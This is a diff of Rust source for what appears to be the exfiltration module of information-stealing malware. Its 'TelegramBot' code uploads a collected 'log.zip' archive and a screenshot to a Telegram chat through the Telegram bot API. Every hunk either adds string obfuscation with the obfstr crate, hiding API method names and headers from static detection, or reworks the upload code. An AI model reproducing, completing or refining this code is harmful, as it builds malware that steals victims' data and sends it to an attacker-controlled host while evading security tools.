@@ -6,7 +6,8 @@ use alloc::{format, vec};
 use collector::{Collector, Device, DisplayCollector};
 use core::fmt::{Display, Error, Formatter};
 use derive_new::new;
-use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
+use obfstr::obfstr as s;
+use requests::{write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
 use utils::format_size;
 
 #[derive(new, Clone)]
@@ -61,20 +62,20 @@ pub struct MediaItem {
 impl MediaGroup {
     pub fn add_document(&mut self, media_name: impl Into<String>, caption: Option<String>) -> &mut Self {
         self.items.push(MediaItem {
-            media_type: "document".to_string(),
+            media_type: s!("document").to_string(),
             media: format!("attach://{}", media_name.into()),
             caption,
-            parse_mode: Some("HTML".to_string()),
+            parse_mode: Some(s!("HTML").to_string()),
         });
         self
     }
 
     pub fn add_photo(&mut self, media_name: impl Into<String>, caption: Option<String>) -> &mut Self {
         self.items.push(MediaItem {
-            media_type: "photo".to_string(),
+            media_type: s!("photo").to_string(),
             media: format!("attach://{}", media_name.into()),
             caption,
-            parse_mode: Some("HTML".to_string()),
+            parse_mode: Some(s!("HTML").to_string()),
         });
         self
     }
@@ -113,7 +114,7 @@ impl TelegramBot {
     fn send_as_file(&self, archive: Vec<u8>, screenshot: Option<Vec<u8>>, caption: String, thumbnail: Option<String>) -> Result<(), SendError> {
         let mut builder = MultipartBuilder::new("----BoundaryMediaGroup");
 
-        builder.write_text_field("chat_id", &self.chat_id);
+        write_text_field!(builder, "chat_id" => &self.chat_id);
 
         let mut media_group = MediaGroup::default();
 
@@ -121,7 +122,7 @@ impl TelegramBot {
             media_group.add_document("screenshot", Some(caption));
             media_group.add_document("logfile", thumbnail);
 
-            builder.write_file_field("screenshot", "screenshot.png", "image/png", screenshot_bytes);
+            write_file_field!(builder, "screenshot", "screenshot.png", "image/png", screenshot_bytes);
         } else {
             let combined_caption = combine_caption_and_thumbnail(&caption, thumbnail);
             media_group.add_document("logfile", Some(combined_caption));
@@ -129,10 +130,10 @@ impl TelegramBot {
 
         let media_json = media_group.to_string();
 
-        builder.write_text_field("media", &media_json);
-        builder.write_file_field("logfile", "log.zip", "application/zip", &archive);
+        write_text_field!(builder, "media" => &media_json);
+        write_file_field!(builder, "logfile", "log.zip", "application/zip", &archive);
 
-        self.send_request("sendMediaGroup", builder)?;
+        self.send_request(s!("sendMediaGroup"), builder)?;
 
         Ok(())
     }
@@ -143,20 +144,20 @@ impl TelegramBot {
         match screenshot {
             Some(photo_bytes) => {
                 let mut builder = MultipartBuilder::new("----BoundaryPhoto");
-                builder.write_text_field("chat_id", &self.chat_id);
-                builder.write_text_field("caption", &combined_caption);
-                builder.write_text_field("parse_mode", "HTML");
-                builder.write_file_field("photo", "screenshot.png", "image/png", &photo_bytes);
+                write_text_field!(builder, "chat_id" => &self.chat_id);
+                write_text_field!(builder, "caption" => &combined_caption);
+                write_text_field!(builder, "parse_mode", "HTML");
+                write_file_field!(builder, "photo", "screenshot.png", "image/png", &photo_bytes);
 
-                self.send_request("sendPhoto", builder)?
+                self.send_request(s!("sendPhoto"), builder)?
             }
             None => {
                 let mut builder = MultipartBuilder::new("----BoundaryPhoto");
-                builder.write_text_field("chat_id", &self.chat_id);
-                builder.write_text_field("text", &combined_caption);
-                builder.write_text_field("parse_mode", "HTML");
+                write_text_field!(builder, "chat_id" => &self.chat_id);
+                write_text_field!(builder, "text" => &combined_caption);
+                write_text_field!(builder, "parse_mode", "HTML");
 
-                self.send_request("sendMessage", builder)?
+                self.send_request(s!("sendMessage"), builder)?
             }
         }
 
@@ -168,7 +169,7 @@ impl TelegramBot {
         let body = body.finish();
 
         Request::post(format!("https://api.telegram.org/bot{}/{}", self.token, method))
-            .header("Content-Type", &content_type)
+            .header(s!("Content-Type"), &content_type)
             .body(body)
             .build()
             .send()
